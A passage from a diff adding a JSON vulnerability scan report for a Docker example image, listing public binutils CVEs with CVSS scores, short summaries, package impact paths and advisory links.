+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532424",
+        "references": [
+          "https://security.netapp.com/advisory/ntap-20231006-0008/",
+          "https://ubuntu.com/security/CVE-2022-48063",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29924",
+          "https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=75393a2d54bcc40053e5262a3de9d70c5ebfbbfd"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-48065",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "GNU Binutils before 2.40 was discovered to contain a memory leak vulnerability var the function find_abstract_instance in dwarf2.c.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532419",
+        "references": [
+          "https://security.netapp.com/advisory/ntap-20231006-0008/",
+          "https://ubuntu.com/security/CVE-2022-48065",
+          "https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=d28fbc7197ba0e021a43f873eff90b05dcdcff6a",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29925"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-47008",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An issue was discovered function make_tempdir, and make_tempname in bucomm.c in Binutils 2.34 thru 2.38, allows attackers to cause a denial of service due to memory leaks.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532421",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-47008",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29255%20"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-35205",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An issue was discovered in Binutils readelf 2.38.50, reachable assertion failure in function display_debug_names allows attackers to cause a denial of service.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532416",
+        "references": [
+          "https://security.netapp.com/advisory/ntap-20231006-0010/",
+          "https://ubuntu.com/security/CVE-2022-35205",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29289"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-35206",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "Null pointer dereference vulnerability in Binutils readelf 2.38.50 via function read_and_display_attr_value in file dwarf.c.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532417",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-35206",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29290"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-47011",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An issue was discovered function parse_stab_struct_fields in stabs.c in Binutils 2.34 thru 2.38, allows attackers to cause a denial of service due to memory leaks.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532423",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-47011",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29261"
+        ]
+      },
+      {
+        "cves": [
+          {
